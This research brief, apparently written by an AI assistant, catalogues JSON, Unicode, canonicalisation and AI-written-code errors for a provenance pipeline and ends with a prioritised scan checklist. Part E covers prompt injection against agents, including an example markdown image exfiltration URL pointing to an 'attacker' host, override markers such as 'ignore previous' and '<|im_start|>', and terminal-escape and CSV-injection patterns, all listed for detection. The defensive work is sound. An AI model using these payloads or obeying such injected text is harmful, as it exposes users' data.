# A2 - GenAI error classes relevant to AgentPROV (research brief)

Date: 2026-10-11. Scope: web research plus a small local probe of Python 3.14.8 `json` and `rfc8785` 0.1.4 (run in an isolated scratch script; repository untouched).
All web pages were treated as untrusted data. Claims are cited as [Sn] (see Sources). Statements marked **(local probe)** were verified by running code on this machine; statements marked **(inference)** are mine, not from a source.
Where the AgentPROV spec (`docs/architecture/C_data_model.md` C.11, AER-V18) already mandates a control, this is noted as "spec covers; verify implementation" - the scans below test that the implementation honours the spec, not that the spec is missing it. I did not read the implementation, only spec excerpts.

---------------------------------------------------------------------------------------------------

## 0. Headline findings (read this first)

1. Structured-output guarantees never cover truncation or refusals. Anthropic and OpenAI both document that `max_tokens` / `max_output_tokens` truncation and `refusal` stop reasons can yield output that does not match the schema [S1][S2][S5]. Logs from before structured outputs existed, or from agents using plain tool use with unvalidated streaming, can contain partial or invalid JSON in tool-call arguments [S3].
2. Valid JSON is not the same as correct JSON. Escapes such as `\t`, `\f`, `\n` in a Windows path such as `D:\test\foo.py` are valid JSON and silently decode to control characters [S10]. Double-encoded arguments (a JSON string containing JSON) are a documented, recurring model/provider failure [S9][S10].
3. The stdlib `json` module is permissive in exactly the ways that matter for a digest chain: last-duplicate-key-wins, accepts `NaN`/`Infinity`, accepts lone surrogates, parses `1e400` to `inf` [S7][S13] **(local probe)**. `rfc8785` 0.1.4 rejects NaN/inf, ints beyond 2^53-1 and (indirectly) lone surrogates, but it silently normalises `1.0` to `1` and `-0.0` to `0`, so float/int and zero-sign information is erased from the digest **(local probe)** [S11].
4. `json.dumps(..., ensure_ascii=False)` followed by `.encode("utf-8")` fails on lone surrogates **(local probe)**; the default `ensure_ascii=True` path hides them as `\ud800` escapes. A mixed pipeline (the legacy baseline canonical JSON uses `ensure_ascii=False, default=str`, spec C.dm line 473) is a likely site for silent mismatches.
5. LLM-written tests tend to encode the implementation's behaviour rather than the specification (oracle problem) [S22][S23]; the AgentPROV golden/compat gates are the right counter-measure, and any test written by an agent should be checked against an independent oracle.
6. Logs from security benchmarks deliberately contain injection strings, invisible Unicode (tag characters, bidi), ANSI escapes, markdown/HTML and log-forging payloads [S24]-[S31]. The risk is in downstream display and tooling (terminal, notebooks, README renders, Zenodo datasheet, Graphviz labels), not in the JSON layer.

---------------------------------------------------------------------------------------------------

## 1. Taxonomy of error classes

Severity key: **S1 critical** (can silently change digests/provenance semantics or corrupt the corpus), **S2 high** (data loss or misattribution likely, detectable only by a dedicated scan), **S3 medium**, **S4 low/hygiene**. (Not to be confused with source ids [Sn].)
Locations: SRC (raw source logs), AER, SEM, PROV (PROV-JSON), DIG (digest chain / manifests), DOC (reports, datasheet, manuscript numbers).

### Part A - Errors in the source data (LLM output as input)

#### A1. Truncated / incomplete generations (max_tokens, context exhaustion)
- Description: Generation stops mid-stream. Anthropic: `stop_reason: max_tokens`, or `model_context_window_exceeded` ("treat as truncated"); with an incomplete trailing `tool_use` block the tool call is cut off [S1]. OpenAI: `status: incomplete`, reason `max_output_tokens` or `content_filter` [S5]. Schema-valid output is only guaranteed for complete responses; Anthropic's structured-outputs page says `max_tokens` output "may be truncated and invalid" [S2].
- Manifestation: tool-call `arguments` that fail `json.loads`; final assistant message ending mid-sentence; a `tool_use` with no matching `tool_result`; `stop_reason`/`finish_reason` of `length`/`max_tokens` in provider metadata; AER events with an unparsed-args marker.
- Detection: census of provider stop/finish reasons per execution (`length`, `max_tokens`, `model_context_window_exceeded`, `incomplete`, `content_filter`, `refusal`, `pause_turn`); for each tool-call event, strict-parse the args and cross-tabulate failures by stop reason; count tool calls with no result; flag the last event of an execution if the stop reason is a truncation. Confirm AER recorded the failure as unparsed/unknown evidence and did not invent structured args.
- Severity: S2 (S1 if a repaired or guessed argument object is recorded as observed - violates invariant 2).
- Citations: [S1][S2][S3][S5].

#### A2. Malformed JSON strings in tool-call arguments
- Description: Models emit arguments as JSON text. Failures documented in open-source agent frameworks: an extra layer of encoding (string containing JSON, needing a second `loads`), invalid backslash escapes, stray or backtick quote characters, trailing commas, single quotes, unquoted keys, markdown code fences around JSON, one string per character, several concatenated objects [S9][S10]. Anthropic's fine-grained tool streaming warns that, without server-side buffering, you "might receive partial or invalid JSON", and recommends an `INVALID_JSON` wrapper in an `is_error` tool result [S3]. Malformed args can persist in conversation history and break later requests [S10].
- Manifestation: args that are `str` after one `json.loads`; args that parse only after repair; Windows path / regex / LaTeX payloads with `\` that decode to control chars; `args_raw` vs `args` disagreement.
- Detection: (a) for every args blob record the parse outcome: ok / ok-but-string-containing-JSON (second parse succeeds) / fails / fails-then-repairs; (b) after decode, scan string values for C0 control chars (other than expected `\n`), especially in path/file/url/command fields; (c) look for runs of `\\` and `\"` sequences in decoded strings (double escaping, see A3); (d) check no code path calls a lenient/repair parser and then stores the result as observed.
- Severity: S2.
- Citations: [S3][S9][S10]; Python strictness [S7].

#### A3. Double escaping and escape-layer confusion
- Description: Text JSON-encoded twice (or YAML-then-JSON) contains literal `\n`, `\"`, `\\u00e9` where the real content should be a newline, a quote, `é`. LangChain history shows models producing `"action_input": "{\\"foo\\": ...}"` [S9]. Source logs from Inspect/AgentDojo may also carry YAML-escaped payloads (the repo routes YAML through `ingest.yamlsafe`).
- Manifestation: literal backslash-n, backslash-quote or backslash-u sequences inside decoded string values; injection-marker matching that fails because the marker is escaped differently (spec C.11.2 notes escaping matters for injection-marker matching); `ext.lex` / `args_raw` holding a different escape layer than decoded args.
- Detection: regex census on decoded strings (see snippets); compare against raw-file counts; for each decoded string that itself parses as JSON, count it (double-decoding probe); report fields where double decoding succeeds.
- Severity: S2 (affects injection-marker analysis, content hashes, text-based claims in the paper).
- Citations: [S9][S10]; spec C.11.2 (internal).

#### A4. Refusals, empty turns, reasoning text, text-encoded tool calls
- Description: Refusals arrive as HTTP 200 with `stop_reason: refusal`; output "may not match your schema" [S1][S2]. Asking for step-by-step reasoning in a schema field can itself trigger a refusal category [S2]. Anthropic notes empty `end_turn` responses can occur after tool results (search-result summary of [S1]; confirm on the page). Models without native tool use write calls as prose/XML/JSON in the text channel; those are text, not calls (inference).
- Manifestation: assistant events with empty content; tool-call-like JSON in a text message; missing `tool_use` where the trace implies one; refusal text recorded as the agent's final answer.
- Detection: census of assistant messages with (a) empty content and no tool calls, (b) text matching tool-call shapes (`^\s*\{.*"name"`, `<tool_call>`, `<function=`), (c) stop reason `refusal`. For each, confirm AER kept the observed channel (text vs structured) and did not promote text to a tool call (that would create a provenance relation without evidence).
- Severity: S2 (semantic misattribution: invariant 2).
- Citations: [S1][S2][S5].

#### A5. Provider-specific ids and identifiers
- Description: tool-call ids differ by provider (`toolu_...` Anthropic, `call_...` OpenAI, synthetic or missing elsewhere - inference); ids can be reused across turns, truncated, mutated by proxies, or absent. Anthropic documents unmatched `server_tool_use`/`mcp_tool_use` blocks with no result [S1].
- Manifestation: duplicate ids within an execution; calls with no result or results with no call; collisions across executions if ids are used as global keys.
- Detection: per execution, multiset of call ids vs result ids (dups, orphans in both directions); global scan that no id is a corpus-level key without an execution prefix; length/charset histogram of ids per provider.
- Severity: S2 (dangling or false PROV `used`/`wasGeneratedBy` links).
- Citations: [S1].

#### A6. Schema drift, wrong types, omitted or invented keys
- Description: Even with constrained decoding some constraints are not enforced: Anthropic does not support numeric ranges, string lengths, `minItems` > 1, or `additionalProperties` other than false, and enum/const values may differ only in capitalisation [S2]. Outside structured-output modes, models drop required keys, invent keys, return numbers as strings or vice versa [S9][S10]. JSONSchemaBench reports that constrained-decoding frameworks differ widely in schema coverage and compliance on hard real-world schemas [S12].
- Manifestation: args that fail the tool's own `input_schema` (when recorded); type variation across rows of the same tool; case variants of enum-like fields.
- Detection: per tool name, histogram of key sets and JSON types per key; flag keys present in <100% of calls and type unions; for enum-like fields flag values equal case-insensitively but not exactly; validate recorded args against recorded tool schemas where available.
- Severity: S3 (S2 if SEM rules key off specific arg names).
- Citations: [S2][S9][S12].

#### A7. Numeric precision and large integers
- Description: JSON numbers beyond IEEE-754 double (ids, token counts, nanosecond timestamps, `1e400`) are mishandled differently by different parsers: in Bishop Fox's study one Go parser decoded a 96-digit number as 0, others returned MAX_INT or a rounded float, and Python's stdlib turned an out-of-range float into Infinity [S13] (**local probe**: `1e400` -> `inf`). I-JSON says integers outside +/-(2^53-1) may not be exact and recommends strings [S15]; RFC 8785 requires I-JSON-expressible numbers and says big numbers should be wrapped as strings [S14].
- Manifestation: `mono_ns`, `unix_ns`, large seeds, token counts, costs; floats like 0.1+0.2; `temperature` as `0.0` vs `0`.
- Detection: scan source numbers (use `parse_int`/`parse_float` hooks to keep text) for ints with |n| > 2^53-1, floats whose `repr` differs from source lexical form, exponent forms, `-0`, `inf/nan` tokens; confirm each lands in `$int`/`$float`/`ext.lex` as spec C.11.3 requires; confirm AER-V18 rejects violators.
- Severity: S1 if a number is rounded before hashing.
- Citations: [S7][S13][S14][S15]; local probe.

#### A8. Unicode: lone surrogates, normalisation, homoglyphs, invisible and bidi characters
- Description: JSON allows `\uD800` unpaired; RFC 8259 says receiver behaviour is unpredictable [S16]; I-JSON forbids it [S15]; JCS must fail on it [S14]. Python accepts and re-emits it [S7] **(local probe)**. LLM output and injected payloads can contain invisible Tags-block characters (a known covert channel into LLMs, "ASCII smuggling") [S26], zero-width characters, bidi overrides and confusables ("Trojan Source", CVE-2021-42574 and CVE-2021-42694) [S28]; UTS #39 defines confusable and mixed-script detection [S29]. NFC and NFD forms of the same text are different bytes and different digests; JCS applies no normalisation [S14] (**local probe**: `"é" != NFD("é")`).
- Manifestation: strings that look identical but hash differently; `$utf16` wrappers in AER; mojibake (`Ã©`, `â€™`); U+FFFD from earlier lossy decoding; emoji with variation selectors/ZWJ; CRLF vs LF.
- Detection: census by Unicode category/block over every string in raw and AER: Cc (except \n \t), Cf (U+200B-200F, U+202A-202E, U+2066-2069, U+FEFF, U+00AD), Co, Cs, Cn, Tags U+E0000-E007F, variation selectors, U+FFFD; mojibake regex; count strings where `normalize('NFC', s) != s`; mixed-script tokens (Latin plus Cyrillic/Greek) in tool names and identifiers; raw vs AER counts must be equal (strings are byte-faithful per spec C.11.2).
- Severity: S1 if any path normalises or drops these; S3 as findings about the data.
- Citations: [S7][S14][S15][S16][S26][S28][S29].

#### A9. Multilingual text, emoji, non-BMP characters, source encodings
- Description: UTF-16 vs code-point differences bite in three places: JCS key order is by UTF-16 code units, so non-BMP keys sort before U+E000-U+FFFF [S14] (**local probe**: U+1F600 sorts before U+FFFF, opposite of Python code-point order); truncation/slicing for display or `quote_untrusted`; surrogate-pair escapes in JSON/YAML. Source files not in UTF-8 (UTF-16 logs, latin-1) can silently mojibake [S17].
- Detection: unit test with non-BMP and BMP-high keys in one object asserting JCS order; scan "preview"/"excerpt" fields for a trailing lone surrogate, trailing ZWJ or variation selector (sliced mid-grapheme); ensure every `open()` has an explicit `encoding` (C2).
- Severity: S2 (ordering) / S3.
- Citations: [S14][S17]; local probe.

#### A10. Prompt-injection payloads in the data (deliberate)
See Part E. Payloads are data and may include fake system tags, tool-call JSON, markdown links/images, ANSI escapes, base64/emoji/multilingual obfuscation [S24][S25][S27].

### Part B - Errors when an LLM (e.g. an Opus subagent) processes, summarises or transforms large data

#### B1. Miscounting and fabricated statistics
- Description: LLMs are unreliable at counting and aggregation; letter-counting errors persist in strong models [S18]; tabular studies find counting and column-localisation errors are lower with symbolic (program) reasoning than textual reasoning [S19]; RULER's aggregation tasks (e.g. word frequency) show large drops as context grows even for models that pass needle-in-a-haystack [S20].
- Manifestation: any number in a report or manuscript note produced by "reading" the corpus rather than by a program; counts that differ between runs; totals not equal to the sum of parts.
- Detection: every reported number must have a reproducible query (script plus output hash). Re-derive all numbers in `docs/reports/analysis` and manuscript notes from `executions.jsonl` with deterministic code and diff. Check identities (sum of category counts == total; per-suite counts sum to corpus total).
- Severity: S1 for manuscript numbers.
- Citations: [S18][S19][S20].

#### B2. Row skipping, silent truncation, lost-in-the-middle
- Description: Accuracy is highest when relevant information is at the start or end of the context and degrades in the middle [S21]; long object-list extraction has recall well below precision (in one study a small model fell below 50% recall) and extraction pipelines can return empty lists with no error [S32]. Context overflow: `model_context_window_exceeded` should be treated as truncated [S1].
- Manifestation: an LLM-produced inventory listing fewer executions than exist; "representative" examples drawn only from the first and last items; a batch job that processed N-k files.
- Detection: cross-check any LLM-produced inventory against `ls`/`wc -l`/manifest counts; require an explicit count assertion (expected N, got N) in batch scripts; sample uniformly at random with a recorded seed rather than "pick some examples"; record input/output counts per batch.
- Severity: S2.
- Citations: [S1][S21][S32].

#### B3. Inconsistent normalisation across batches
- Description: Different subagents/batches apply different conventions (case, whitespace, path style, date format, enum spelling); constrained decoding can change enum/const capitalisation [S2]; Anthropic recommends chaining small sub-tasks for consistency [S33], which makes consistency a property of prompts, not a guarantee.
- Detection: for every categorical field in outputs, histogram distinct values across batches/sources and look for near-duplicates (case-fold, strip, NFKC-equal but not identical); per-source distribution of timestamp formats and offsets; process the same record twice and hash-compare (determinism, invariant 4).
- Severity: S2.
- Citations: [S2][S33].

#### B4. Format constraints and content quality
- Description: Whether forcing JSON/schema output degrades reasoning is contested [S34]; the practical lesson is to validate content, not only syntax. If any LLM step populates fields (e.g. SEM annotations), its output is inference, not evidence, and must go to inference bundles.
- Severity: S3.
- Citations: [S34].

### Part C - Errors in AI-written code (data-pipeline pitfalls)

Empirical grounding. Tambon et al. catalogue 10 bug patterns in LLM-generated code: Misinterpretations, Syntax Error, Silly Mistake, Prompt-biased code, Missing Corner Case, Wrong Input Type, Hallucinated Object, Wrong Attribute, Incomplete Generation, Non-Prompted Consideration [S35]. A 72-study review finds semantic/logical bugs most common, with 9 of 10 Copilot studies reporting functional bugs [S36]. CodeRabbit's comparison of 470 PRs reports about 1.7x more issues in AI-coauthored PRs, with logic/correctness about 75% higher (vendor study, small sample) [S37]. Pearce et al. found about 40% of Copilot programs vulnerable in security-relevant scenarios (old tool, constrained scenarios) [S38]. LLM test generators tend to emit assertions matching observed behaviour [S22][S23]. Package hallucination rates were at least 5.2% (commercial) and 21.7% (open models) [S39]. These establish bug classes, not frequencies for current Claude models on Python data pipelines.

#### C1. Canonicalisation and serialisation misuse
- Description (locally verified where marked):
  - `json.dumps` defaults: `ensure_ascii=True`, `allow_nan=True` (emits `NaN`/`Infinity`), `sort_keys=False`; `sort_keys` sorts by Python code point, not JCS UTF-16 order; `default=str` silently stringifies unknown objects [S7] **(local probe)**.
  - `json.loads` accepts duplicate keys (last wins), `NaN`, `Infinity`, `1e400` -> `inf`, lone surrogates; raises on a leading BOM in `str` input; `bytes` input auto-detects UTF-8/16/32 [S7] **(local probe)**.
  - `rfc8785` 0.1.4: rejects NaN/inf (`FloatDomainError`), ints outside +/-(2^53-1) (`IntegerDomainError`), non-str keys, bytes; converts `-0.0` to `0` and `1.0` to `1`; does not escape U+007F or U+2028/2029 (raw UTF-8, which is what JCS specifies); a lone surrogate in a string value raises `CanonicalizationError` but in a key leaks a raw `UnicodeEncodeError`; tuples serialise as arrays [S11] **(local probe)**.
  - Float/int erasure: `1.0` and `1` have identical JCS bytes and digest. This is correct per RFC 8785 but loses type information, hence the spec's `ext.lex` hints.
- Manifestation: two executions differing only in `1` vs `1.0` collide; a digest computed on `json.dumps(sort_keys=True)` in one place and JCS in another; validators that accept NaN.
- Detection: grep code and tools for `json.dumps(`, `json.loads(`, `json.load(`, `sort_keys`, `ensure_ascii`, `default=`, `allow_nan`, `separators`; every digest-affecting call must go through `aer.canon`. Property tests: parse(canon(x)) equals x for fuzzed I-JSON, and hostile non-I-JSON inputs must raise, never coerce. Differential test against an independent JCS implementation (Rundgren reference or a JS `JSON.stringify`-based one) on tricky numbers (1e21, 1e-7, 5e-324, 1.7976931348623157e308, 100000000000000000000.0, -0.0) and keys (non-BMP vs U+E000-U+FFFF).
- Severity: S1.
- Citations: [S7][S11][S14][S15]; local probe.

#### C2. Encoding and I/O defaults
- Description: `open()` without `encoding=` uses the locale encoding; PEP 686 makes UTF-8 mode the default only from Python 3.15, so on 3.14 omission still depends on the environment and can cause `UnicodeError`, mojibake or silent corruption [S17]. Related: newline translation (`\r\n`) on write, `errors="replace"|"ignore"` which substitutes or drops bytes, `str(bytes)`.
- Detection: ruff/grep for `open(`, `read_text()`, `write_text()` without `encoding` (and `newline=""` for JSONL), and any `errors=` in `ingest/`, `raw/`, `aer/`; scan outputs for U+FFFD and `\r`; verify raw bytes -> raw store -> read back -> sha256 equal; run the suite with `PYTHONUTF8=0 LC_ALL=C` to expose locale dependence.
- Severity: S1 for raw/AER writers; S3 for tools.
- Citations: [S17].

#### C3. Time, locale and ordering
- Description: `datetime.utcnow()` / `utcfromtimestamp()` (deprecated since 3.12) return naive datetimes and mis-convert when the system timezone is not UTC [S40]; float seconds and `isoformat()` truncation; locale-dependent string sorting; `str.lower()` vs `casefold()`; `glob`/`os.listdir` ordering (filesystem-dependent) feeding digests; set iteration order and `PYTHONHASHSEED` (inference for the ordering items).
- Detection: grep for `utcnow`, `utcfromtimestamp`, `fromtimestamp(` without tz, `datetime.now()`, `time.time()`, `localtime`, `strftime`, `sorted(` over `glob`/`listdir` without explicit key; run the deterministic-recompute gate under `TZ=UTC` and `TZ=Pacific/Auckland`, varied `PYTHONHASHSEED`, `LC_ALL=tr_TR.UTF-8`, and worker counts 1/4/8: outputs must be byte-identical (invariant 4). Count events whose timestamp came from the parse-time clock rather than the source (invariant 2).
- Severity: S1 (determinism) / S2.
- Citations: [S40].

#### C4. Exception swallowing, over-broad regexes, silent defaults
- Description: AI-written code characteristically adds defensive `try/except Exception: continue/pass`, `dict.get(k, "")`, `or {}` defaults, `errors="ignore"`, and over-broad regexes; the bug taxonomy lists Missing Corner Case, Silly Mistake and Non-Prompted Consideration [S35]; CodeRabbit flags elevated logic and error-handling issues (vendor) [S37]; a vendor post describes silent data corruption in AI-generated pipelines, e.g. a join fan-out on duplicate keys [S41]. In a provenance pipeline, silent defaults manufacture evidence.
- Detection: static: ruff rules `E722`, `BLE001`, `S110`, `S112`, `SIM105`; grep `except Exception`, `except:`, and `pass`/`continue` in except blocks; grep `.get(` with literal fallbacks in mapper code. Dynamic: every mapper reports `n_in == n_out + n_rejected` with reasons, surfaced in the manifest; mutation-test mappers (drop a field in a fixture, confirm a loud failure). Regex audit: list every regex in `src/` and test with adversarial strings (multi-line, Unicode, nested quantifiers); require `fullmatch`/anchors where whole-string match is intended; use `re.ASCII` where `\d`/`\w` must not match non-ASCII digits/letters (inference on Python `str` semantics).
- Severity: S1/S2.
- Citations: [S35][S37][S41].

#### C5. Tests that assert the implementation
- Description: LLM-generated oracles frequently capture actual rather than expected behaviour; when a generated test fails, tools often "fix" the test to match the code, hard-coding the bug [S22][S23].
- Manifestation: golden files regenerated by an agent after a code change; expected values computed by calling the function under test; fixtures produced by the same mapper they test.
- Detection: for every golden file in `tests/`, check git history for regeneration in the same commit as the producing code; require independent oracles (hand-computed digests, RFC 8785 test vectors, the frozen `prov/compat/adprov_v2_3` baseline graphs, a second JCS implementation); run mutation testing (`mutmut`) on `aer/canon.py`, `ingest/`, and mappers (surviving mutants = tests that assert nothing); Hypothesis property tests on specification invariants (idempotence, order independence, round trip).
- Severity: S1 for the golden gates.
- Citations: [S22][S23].

#### C6. Hallucinated APIs, wrong attributes, stale knowledge
- Description: hallucinated objects/attributes are named LLM-code bug patterns [S35]; package hallucination is non-trivial and attackable ("slopsquatting") [S39]. Version-specific hazards in Python 3.14 and in `prov`, `rdflib`, `rfc8785`, `pyyaml`.
- Detection: `uv lock --check`; compare every import against `pyproject.toml`/`uv.lock`; `python -W error -m pytest` to turn deprecations into failures; grep for `getattr(` with string defaults and `hasattr(` guards that mask missing attributes; check any new dependency name exists on PyPI and is the intended project.
- Severity: S2.
- Citations: [S35][S39].

#### C7. Path handling and filesystem effects
- Description: archive member names as paths (zip-slip), NFC/NFD filename differences on macOS, case-insensitive collisions, symlinks, absolute paths embedded in artefacts (leaking `/Users/...`). The spec already treats member names as labels with NFC labels (C.dm line 543; DECISIONS line 259).
- Detection: scan all AER/PROV/manifests for `/Users/`, `/home/`, `C:\`, `~/`, `AGENTPROV_HOME`; labels containing `..`, leading `/`, NUL, backslash; case-fold duplicates within a container; run import on macOS and Linux and compare bytes.
- Severity: S2.
- Citations: spec (internal); inference.

### Part D - JSON interoperability and canonicalisation hazards (digest chain)

#### D1. Parser differentials and duplicate keys
- Bishop Fox surveyed 49 parsers: duplicate-key precedence differs (Python stdlib: last wins; several Go/C++/Java/Elixir parsers: first wins), key collision via character truncation (e.g. `test\ud800` vs `test`), comment handling, serialisation quirks (duplicate keys re-emitted unchanged), large-number and out-of-range-float behaviour, trailing garbage accepted [S13]. RFC 8259 says names SHOULD be unique and behaviour is otherwise unpredictable [S16]; I-JSON and JCS forbid duplicates [S14][S15]. JSON Schema validates the parsed object and cannot see what the parser discarded [S13].
- Manifestation: a source log with the same key twice (an injected payload can plant a second `"role"`/`"tool"` key); Python keeps the last, another verifier keeps the first, so independent re-verification disagrees. The spec says the AgentPROV loader rejects duplicate keys (C.dm line 1721) - verify.
- Detection: parse every raw JSON/JSONL with an `object_pairs_hook` that raises on duplicates and count hits per source; cross-check a sample with a second parser (jq, Node, Rust `serde_json`) comparing canonical output; keys that differ only after escape resolution (`"a\u0062"` vs `"ab"`) or NFC.
- Severity: S1 (source trust), S2 otherwise.
- Citations: [S7][S13][S14][S15][S16].

#### D2. RFC 8785 specifics a stdlib + rfc8785 pipeline can still get wrong
- JCS requires I-JSON input: no duplicate names, IEEE-754 doubles, Unicode scalar strings; lone surrogates MUST cause failure; NaN/Infinity MUST fail; keys sorted by UTF-16 code units; array order preserved; numbers serialised per ECMAScript; no Unicode normalisation; numbers needing more precision should be strings [S14].
- Pitfalls: (a) canonicalising after a parser already rounded a long number; (b) a lone surrogate in a *key* raises a raw `UnicodeEncodeError` rather than `CanonicalizationError` **(local probe)**, so callers catching only `CanonicalizationError` crash, and callers catching `Exception` may skip silently; (c) `1.0`->`1`, `-0.0`->`0` merge **(local probe)** [S11]; (d) digesting objects containing `tuple`/`set`/`Decimal`/`datetime`/`Path`: tuples become arrays, others raise, and `default=str`-style coercions in baseline code are unsafe; (e) line endings and trailing newline in JSONL are not part of JCS, so the file-level format needs its own fixed rule; (f) pretty-printed PROV-JSON (`indent=2`, `ensure_ascii=True`) is not JCS, so hashes over it must pin the exact serialisation; (g) check RFC 8785 errata when writing independent verifiers [S14].
- Detection: as C1; add RFC 8785 test vectors; verify every digest in `checksums.sha256`/manifests names its canonicalisation (`canon` field) and that the verifier recomputes it in a fresh process.
- Severity: S1.
- Citations: [S11][S14][S15].

#### D3. Other RFC 8259 and Python-stdlib ambiguities
- BOM: producers must not add; parsers may ignore; Python `json.loads(str)` raises on a leading BOM **(local probe)** [S16][S7]. Raw control characters in strings must be escaped (Python strict mode rejects a raw newline) **(local probe)**. `\u0000` is accepted and yields a NUL in the Python string **(local probe)**, which can truncate in C-based consumers (inference; cf. truncation-based key collisions [S13]).
- JSONL splitting: Python `str.splitlines()` also splits on `\x0b`, `\x0c`, `\x1c`-`\x1e`, `\x85`, U+2028 and U+2029, all of which can legitimately appear raw inside a JSON string. An LLM-written reader using `splitlines()` on JSONL would silently split a record. Always split on `\n` bytes (inference from documented Python semantics; test locally).
- Detection: byte-level census over raw files: leading `EF BB BF` / UTF-16 BOMs; NUL (raw and escaped); CR/CRLF in JSONL; U+2028/2029 and U+0085 inside strings; grep the repo for `.splitlines()` applied to JSONL text.
- Severity: S1 for JSONL-splitting bugs; S3 otherwise.
- Citations: [S7][S13][S16].

#### D4. Hash-chain semantic gaps
- A chain proves integrity of what was hashed, not that the hashed content is faithful to the source. Truncation at a line boundary and a well-formed edit of the final line are undetectable without an external anchor (spec C.dm line ~1716-1718: the manifest head is the anchor).
- Detection: confirm the manifest head is stored outside the chained file and recomputed independently; run negative tests (single-byte flip, truncation at line boundary, line reorder, duplicate-line insertion, swap of two files) against `agentprov verify`.
- Severity: S2.
- Citations: spec (internal); [S14].

### Part E - Text-in-data hazards for security-research corpora

#### E1. Prompt-injection strings reaching downstream LLMs or agents
- Indirect injection is the core phenomenon in the benchmark data [S25]; OWASP lists obfuscation by Base64, multilingual text, emoji and adversarial suffixes [S24]. Anything that feeds corpus text to an LLM (summarisation subagents, LLM-assisted SEM, coding agents reading fixtures or upstream clones' CLAUDE.md/AGENTS.md) can be hijacked; invisible Tag characters let instructions hide from human review [S26]. OWASP's mitigations include treating the model as untrusted, least privilege, segregating and labelling untrusted content, deterministic output validation [S24].
- Detection: when a subagent reads corpus text, require delimiting via `quote_untrusted` and an instruction-hierarchy preamble; review subagent outputs for unexpected tool calls or file writes; pre-scan corpora for imperative markers (`ignore previous`, `system:`, `<|im_start|>`, `</tool_response>`) for awareness only - these are expected in the data, and the control is containment, not removal. Do not run LLM summarisers over raw corpus text with write-capable tools.
- Severity: S1 for processing agents; S4 for the data itself.
- Citations: [S24][S25][S26].

#### E2. Terminal escape sequence injection
- LLM output (and injected payloads) can contain ANSI/VT control sequences that move the cursor, hide text, or write to the clipboard when printed ("Terminal DiLLMa"); log files carrying them affect whoever `cat`s them; mitigations include caret notation for non-printables and stripping CSI/OSC/DCS/C1 sequences before display or model ingestion [S27].
- Detection: census for raw `\x1b`, C1 `\x9b`/`\x9d`, `\x07`, `\x08`, `\x0d`, and escaped spellings (`\u001b`, `\x1b`, `\033`) in raw, AER and generated reports; check CLI output paths (`agentprov` printing excerpts) go through `quote_untrusted` or `repr`-style escaping; `grep -P '\x1b' -r` over reports, README and datasheet.
- Severity: S2.
- Citations: [S27].

#### E3. Markdown/HTML rendering of untrusted text
- If log text is rendered as Markdown, an injected `![](https://attacker/?q=...)` image fetch exfiltrates data on render; documented against ChatGPT, GitLab Duo, Hugging Face Chat and the Continue extension [S30]. Also raw HTML/SVG/script in rendered reports, link spoofing, and Graphviz label injection in `agentprov render` (inference).
- Detection: scan generated Markdown/HTML/DOT/SVG for `![`, `<img`, `<script`, `javascript:`, `<iframe`, `onerror=`, and URLs that originate from data fields; unit-test render with hostile labels (quotes, `}`, `<`, newlines, `"; digraph`); view reports in a viewer with network disabled; fence untrusted text in code blocks using a fence longer than any backtick run inside it.
- Severity: S2.
- Citations: [S30].

#### E4. Log forging and record injection
- CWE-117: unneutralised external input in log lines enables fake entries, hidden activity and corrupted log format; CRLF injection is the classic carrier [S31]. For JSONL/CSV/TSV/Markdown tables the analogues are embedded newlines breaking record boundaries, CSV formula injection (leading `=`, `+`, `-`, `@`), and pipes/tabs in table cells (inference).
- Detection: assert one-record-per-line for every JSONL (newline count equals record count; the AER validator's re-serialise-and-compare covers this); scan CSV/TSV/Markdown exports for cells starting with `= + - @ \t \r` and for embedded `\n`/`|`; ensure logging calls format untrusted fields with `%r` or structured logging.
- Severity: S2.
- Citations: [S31].

#### E5. YAML-escaped payloads and implicit typing
- PyYAML follows YAML 1.1: `NO`, `on`, `off` become booleans (the "Norway problem"), `22:22` becomes the sexagesimal integer 1342, `1.10` becomes `1.1`; `safe_load` avoids arbitrary object construction but not implicit typing [S42]. The repo routes YAML through `ingest.yamlsafe`; verify it uses a safe loader with all scalars kept as strings or loudly rejected, with limits on aliases (billion laughs) and depth.
- Detection: fixtures `NO`, `yes`, `0o17`, `1_000`, `22:22`, `2001-01-01`, `~`, `null`, `1e3`, `!!python/object`, alias chains; assert string results or loud rejection; census YAML-derived values whose Python type is not `str` where a string is expected.
- Severity: S2.
- Citations: [S42].

---------------------------------------------------------------------------------------------------

## 2. Anthropic/Claude-specific notes (documented)

- Structured outputs: constrained decoding guarantees valid JSON matching the schema for completed responses; strict tool use applies to tool names and inputs. Unsupported keywords give a 400; numeric/string-length constraints are not enforced server-side (SDK helpers validate locally); enum/const may differ in capitalisation; refusals and `max_tokens` can yield non-conforming output; schema complexity limits and first-request grammar-compile latency exist [S2].
- Stop reasons to census in any Claude-origin log: `end_turn`, `max_tokens`, `stop_sequence`, `tool_use`, `pause_turn`, `refusal`, `model_context_window_exceeded`; in streaming `stop_reason` appears only in `message_delta` [S1]. A log capturing only content-block events loses the stop reason (inference).
- Streaming tool input: `content_block_start` carries placeholder `input: {}`; real input is the concatenation of `input_json_delta.partial_json` fragments parsed at `content_block_stop`; with fine-grained tool streaming (`eager_input_streaming`) the API does not validate the JSON, so accumulated input may be invalid or cut mid-parameter at `max_tokens` [S3]. An importer reconstructing args from deltas must accumulate per content-block index and then parse, guarded.
- Prefill is unsupported on Claude 4.6+ models; structured outputs are the supported route to guaranteed JSON [S33]. Older logs may contain prefill artefacts (inference).
- Record observed model identifiers and commits, never assumed versions (project reproducibility rule).

---------------------------------------------------------------------------------------------------

## 3. Prioritised scan checklist (run over corpora and code)

**P0 - run first; failures could invalidate digests or conclusions**

1. **Byte-faithfulness round trip (raw -> AER -> regenerated source view).** Regenerate source representation from AER (`ext.lex`, transcript/v1 byte view) and compare bytes/sha256 with raw; report mismatches by cause. (C1, C2, A7, A8, D2)
2. **Determinism matrix.** `agentprov recompute --check` under `TZ` in {UTC, Pacific/Auckland}, `PYTHONHASHSEED` in {0, 1, random}, `LC_ALL` in {C.UTF-8, tr_TR.UTF-8}, `PYTHONUTF8` in {0, 1}, workers {1, 4, 8}. Expect 0 diffs. (C2, C3)
3. **Strict re-parse of every JSON/JSONL artefact** (AER, SEM, PROV-JSON, manifests, executions.jsonl): reject duplicate keys, NaN/Infinity, lone surrogates, BOM, trailing garbage, ints > 2^53-1, `1e400`, depth bombs; confirm re-serialise equals bytes. (D1, D2, A7)
4. **Independent JCS cross-check.** Compare `rfc8785.dumps` with a second implementation on RFC 8785 vectors and on every canonical line (or a large random sample), including non-BMP/BMP-high key order, exponent numbers, `1.0`/`1`. (C1, D2, A9)
